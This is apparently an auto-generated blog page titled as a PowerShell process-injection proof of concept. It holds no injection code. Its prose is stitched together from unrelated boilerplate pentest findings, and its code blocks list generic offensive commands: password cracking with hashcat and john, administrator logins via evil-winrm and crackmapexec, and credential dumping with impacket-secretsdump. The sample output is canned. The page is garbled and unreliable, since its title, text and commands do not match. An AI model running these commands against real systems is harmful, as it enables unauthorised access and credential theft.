---
TitleSEO: "Process Injection PoC in PowerShell | ZureFX"
TitlePost: "Process Injection PoC — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for process injection poc. Built for security research and automation."
Keywords: "tool, c, parser, powershell"
URL: "https://zurefx.github.io/scripting/script-process-injection-poc-135.html"
URL_IMAGES: ""
Date: "2026-01-05"
Tags: "Tool, C, Parser, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-process-injection-poc-135"
Permalink: "/scripting/script-process-injection-poc-135.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `ffuf`
- `bloodhound`
- `socat`

## Implementation

### Core Logic

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

```powershell
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.60.94.209 -u administrator -p 'P@ssw0rd!'
```

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials.

### Helper Functions

Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.44.151.201 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.65.154.244 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p21,3389,1521 10.81.88.10 -oN scan.txt
```

## Usage

### Basic Usage

The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
feroxbuster -h
```

### Advanced Options

Token impersonation allowed elevation to SYSTEM privileges on the target. Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
crackmapexec smb 10.85.118.115 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.66.238.2
```

## Output

### Example Output

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

```
[+] Scanning target...
[+] Found 11 results
[+] Done in 4.83s
```
